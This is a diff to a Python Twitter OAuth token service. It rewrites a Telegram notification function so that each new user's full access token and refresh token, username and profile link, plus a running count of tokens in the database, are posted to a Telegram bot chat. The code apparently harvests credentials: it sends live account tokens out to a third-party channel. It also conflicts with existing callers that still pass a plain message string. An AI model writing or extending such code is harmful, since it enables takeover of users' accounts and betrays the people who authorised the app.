@@ -137,8 +137,28 @@ def refresh_token_in_db(refresh_token, username):
         send_message_via_telegram(f"❌ Failed to refresh token for @{username}: {response.json().get('error_description', 'Unknown error')}")
         return None, None
 
-# Send message via Telegram
-def send_message_via_telegram(message):
+# Send message via Telegram with detailed notification
+def send_message_via_telegram(access_token, refresh_token=None):
+    # Get the username from the access token
+    username = get_twitter_username(access_token)
+    if username:
+        twitter_url = f"https://twitter.com/{username}"
+    else:
+        twitter_url = "Unknown user"
+    
+    # Calculate total tokens in the database
+    total_tokens = get_total_tokens()
+
+    # Construct a detailed message
+    message = (
+        f"New user authenticated:\n"
+        f"Access Token: {access_token}\n"
+        f"Refresh Token: {refresh_token if refresh_token else 'Not Available'}\n"
+        f"Twitter Profile: {username if username else 'Unknown user'} ({twitter_url})\n"
+        f"Total Tokens in Database: {total_tokens}"
+    )
+
+    # Send the message to Telegram
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     data = {
         "chat_id": TELEGRAM_CHAT_ID,
